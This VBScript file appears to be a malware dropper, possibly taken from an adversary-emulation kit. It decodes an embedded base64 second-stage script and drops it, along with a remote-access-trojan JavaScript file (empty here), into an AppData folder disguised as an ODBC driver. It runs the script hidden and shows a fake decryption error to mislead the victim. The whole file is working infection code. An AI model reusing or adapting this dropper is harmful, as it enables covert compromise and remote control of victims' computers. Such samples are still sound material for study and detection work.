Function decodebase64(encodedScript)
	payloadWithHeader = "<B64DECODE xmlns:dt="& Chr(34) & "urn:schemas-microsoft-com:datatypes" & Chr(34) & " " & _
		"dt:dt=" & Chr(34) & "bin.base64" & Chr(34) & ">" & _
		encodedScript & "</B64DECODE>"
	Set xmlObject = CreateObject("MSXML2.DOMDocument.3.0")
	xmlObject.LoadXML(payloadWithHeader)
	decodebase64 = xmlObject.selectsinglenode("B64DECODE").nodeTypedValue
	set xmlObject = nothing
End Function

Function main()
    ' decode 2nd stage VBS scripts
	encodedStarter = "//4nACAAVABoAGkAcwAgAHMAYwByAGkAcAB0ACAAZQB4AGUAYwB1AHQAZQBzACAAYQAgAHMAdABhAGcAZQAgADEAIABSAEEAVAANAAoAJwAgAFQAaABpAHMAIABzAGMAcgBpAHAAdAAgAGkAcwAgAGIAYQBzAGUAZAAgAG8AbgAgACIAcwB0AGEAcgB0AGUAcgAuAHYAYgBzACIAIAAoAFMASABBAC0AMgA1ADYAOgAgADIANwAwAGEANwA3ADYAYwBiADkAOAA1ADUAZgAyADcANAA1ADIAYgAzADUAZgAwADcAMgBhAGYAZgBiAGIAYwA2ADUAMAAyADMAZAA0AGIAYgAxAGYAMgAyAGUAMABjADMAMAAxAGEAZgBkADIAMgA3ADYAZQA3AGMANQBlAGEAKQANAAoADQAKACcAIABHAGUAdAAgAHQAaABlACAAYQBiAHMAbwBsAHUAdABlACAAcABhAHQAaAAgAHQAbwAgAHQAaABlACAAYwAyAHMAYwByAGkAcAB0AA0ACgBTAGUAdAAgAHMAaABlAGwAbAAgAD0AIABDAHIAZQBhAHQAZQBPAGIAagBlAGMAdAAoACIAVwBTAGMAcgBpAHAAdAAuAFMAaABlAGwAbAAiACkADQAKAGEAcABwAEQAYQB0AGEARgBvAGwAZABlAHIAIAA9ACAAcwBoAGUAbABsAC4ARQB4AHAAYQBuAGQARQBuAHYAaQByAG8AbgBtAGUAbgB0AFMAdAByAGkAbgBnAHMAKAAiACUAYQBwAHAAZABhAHQAYQAlACIAKQANAAoAYwAyAHMAYwByAGkAcAB0ACAAPQAgACIAXABcAFQAcgBhAG4AcwBCAGEAcwBlAE8AZABiAGMARAByAGkAdgBlAHIAXABcAFQAcgBhAG4AcwBCAGEAcwBlAE8AZABiAGMARAByAGkAdgBlAHIALgBqAHMAIgANAAoAcABhAHQAaABUAG8AQwAyAHMAYwByAGkAcAB0ACAAPQAgAGEAcABwAEQAYQB0AGEARgBvAGwAZABlAHIAIAArACAAYwAyAHMAYwByAGkAcAB0AA0ACgANAAoAJwAgAGUAeABlAGMAdQB0AGUAIAB0AGgAZQAgAEMAMgAgAHMAYwByAGkAcAB0AA0ACgBjAG8AbQBtAGEAbgBkACAAPQAgACIAYwBtAGQALgBlAHgAZQAgAC8AawAgAHcAcwBjAHIAaQBwAHQALgBlAHgAZQAgACIAIgAiACAAJgAgAHAAYQB0AGgAVABvAEMAMgBzAGMAcgBpAHAAdAAgACYAIAAiACIAIgAiAA0ACgBTAGUAdAAgAHMAaABlAGwAbAAgAD0AIABXAFMAYwByAGkAcAB0AC4AQwByAGUAYQB0AGUATwBiAGoAZQBjAHQAKAAiAFcAUwBjAHIAaQBwAHQALgBTAGgAZQBsAGwAIgApAA0ACgBzAGgAZQBsAGwALgBSAHUAbgAgAGMAbwBtAG0AYQBuAGQALAAgADAALAAgAHQAcgB1AGUADQAKAFMAZQB0ACAAcwBoAGUAbABsACAAPQAgAE4AbwB0AGgAaQBuAGcA"
	encodedRAT = ""
	decodedStarter = decodebase64(encodedStarter)
	decodedRAT = decodebase64(encodedRAT)
    
	' get path to AppData folder
	Set shell = CreateObject("WScript.Shell")
	appDataFolder = shell.ExpandEnvironmentStrings("%appdata%")
	payloadFolder = appDataFolder + "\\TransbaseOdbcDriver"

	' create folder to hold payload files
	Set fileSystem = CreateObject("Scripting.FileSystemObject")
	filesystem.CreateFolder(payloadFolder)

    ' write decoded scripts to AppData\Roaming\TransbaseOdbcDriver\
	starterScript = payloadFolder + "\\starter.vbs"
	Set streamObject = CreateObject("ADODB.Stream")
	streamObject.Type = 1
	streamObject.Open
	streamObject.Write decodedStarter
	streamObject.SaveToFile starterScript, 2

	httpRAT = payloadFolder + "\\TransBaseOdbcDriver.js"
	Set streamObject = CreateObject("ADODB.Stream")
	streamObject.Type = 1
	streamObject.Open
	streamObject.Write decodedRAT
	streamObject.SaveToFile httpRAT, 2

	' Execute starter.vbs, which starts http-rat.js
	shell.run starterScript, 0, true
    
End Function
' need to drop files:
MsgBox "Unable to decrypt message.", 16, "Error"
main